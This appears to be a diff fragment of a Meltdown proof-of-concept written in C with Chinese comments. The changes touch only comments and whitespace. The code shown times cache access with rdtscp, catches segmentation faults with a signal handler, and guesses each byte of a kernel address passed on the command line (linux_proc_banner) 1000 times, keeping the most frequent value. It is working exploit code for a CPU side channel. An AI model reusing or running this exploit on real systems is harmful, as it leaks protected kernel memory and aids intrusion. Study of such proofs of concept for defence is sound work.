@@ -16,7 +16,6 @@ int time_calculate(volatile char *addr){
     time_true = __rdtscp(&tmp) - time_base;//总时间
     return time_true;
 }
-
 int  find_addr(){  
     int i,m;
     int volatile rand_i,min_i,min_time=2000,j,time;
@@ -67,22 +66,21 @@ int readbyte(int fd,char *addr){//运用meltdown原理读取指定地址addr内�
     return find_addr();
 }
 int main(int argc, const char* * argv){
-    
-    signal(SIGSEGV,dealsth);//注册SIGSEGV信号的捕获函数
+    signal(SIGSEGV,dealsth);//段错误跳回
     int score[256]={};
     char* addr;
     char buf[100];
     int tmp,len;
     int fd = open("/proc/version", O_RDONLY);
     int m,n;
-    sscanf(argv[1],"%lx",&addr);//melt.sh传来了linux_proc_banner的地址
-    sscanf(argv[2],"%d",&len);//读取指定数量的字节
-    printf("读取该地址：%lx后%d长度的内容\n",addr,len);
+    sscanf(argv[1],"%lx",&addr);//从其他命令读入
+    sscanf(argv[2],"%d",&len);
+    printf("addr：%lx length:%d\n",addr,len);
     for (int j=0;j<len;j++){
         memset(score,0,sizeof(score));
         for (int i=0;i<1000;i++){//进行1000次猜测
-            score[readbyte(fd,addr)]++;//猜测的值加1
-        }
+            score[readbyte(fd,addr)]++;
+        }//选最大可能的
         for (m=n=0;m<256;m++){
         if (score[m]>score[n]) n=m;
         }
